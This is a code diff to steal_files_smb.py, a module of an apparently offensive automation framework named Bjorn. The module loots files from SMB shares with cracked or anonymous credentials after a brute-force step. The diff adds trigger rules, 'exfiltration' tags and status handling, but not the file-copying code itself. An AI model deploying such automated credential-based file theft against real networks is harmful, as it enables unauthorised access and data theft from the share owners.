@@ -1,12 +1,4 @@
-"""
-steal_files_smb.py — SMB file looter (DB-backed).
-
-SQL mode:
-- Orchestrator provides (ip, port) after parent success (SMBBruteforce).
-- DB.creds (service='smb') provides credentials; 'database' column stores share name.
-- Also try anonymous (''/'').
-- Output under: {data_stolen_dir}/smb/{mac}_{ip}/{share}/...
-"""
+"""steal_files_smb.py - Loot files from SMB shares using cracked or anonymous credentials."""
 
 import os
 import logging
@@ -25,6 +17,24 @@ b_module = "steal_files_smb"
 b_status = "steal_files_smb"
 b_parent = "SMBBruteforce"
 b_port   = 445
+b_enabled = 1
+b_action = "normal"
+b_service = '["smb"]'
+b_trigger = 'on_any:["on_cred_found:smb","on_service:smb"]'
+b_requires = '{"all":[{"has_cred":"smb"},{"has_port":445}]}'
+b_priority = 60
+b_cooldown = 3600
+b_timeout = 600
+b_stealth_level = 5
+b_risk_level = "high"
+b_max_retries = 1
+b_tags = ["exfil", "smb", "loot", "files"]
+b_category = "exfiltration"
+b_name = "Steal Files SMB"
+b_description = "Loot files from SMB shares using cracked or anonymous credentials."
+b_author = "Bjorn Team"
+b_version = "2.0.0"
+b_icon = "StealFilesSMB.png"
 
 
 class StealFilesSMB:
@@ -166,6 +176,8 @@ class StealFilesSMB:
     def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
         try:
             self.shared_data.bjorn_orch_status = b_class
+            # EPD live status
+            self.shared_data.comment_params = {"ip": ip, "port": str(port), "share": "?", "files": "0"}
             try:
                 port_i = int(port)
             except Exception:
@@ -250,3 +262,6 @@ class StealFilesSMB:
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
+        finally:
+            self.shared_data.bjorn_progress = ""
+            self.shared_data.comment_params = {}
